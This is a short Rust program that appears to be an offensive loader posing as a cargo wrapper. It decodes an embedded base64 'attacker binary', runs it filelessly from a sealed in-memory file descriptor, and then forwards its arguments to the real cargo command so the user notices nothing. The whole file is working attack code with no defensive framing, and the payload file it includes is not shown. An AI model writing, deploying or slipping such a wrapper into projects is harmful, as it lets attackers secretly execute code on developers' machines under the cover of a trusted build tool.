use pentacle::SealedCommand;
use std::io::{Cursor, Result};
use base64::decode;
use std::process::Command;
use std::env;

const ATTACKER_BINARY: &str = include_str!("base64_overwrite_source");

fn main() -> Result<()> {
    // Decode base64 encoded attacker binary
    let attacker_binary = decode(ATTACKER_BINARY).unwrap();
    // Create memfd, inject attacker binary into it and execute it
    SealedCommand::new(&mut Cursor::new(attacker_binary))?.output()?.status.success();
    
    if let Ok(mut c) = Command::new("cargo")
            .args(env::args().skip(1).into_iter())
            .spawn() {
                c.wait()?;
            }

    Ok(())
}
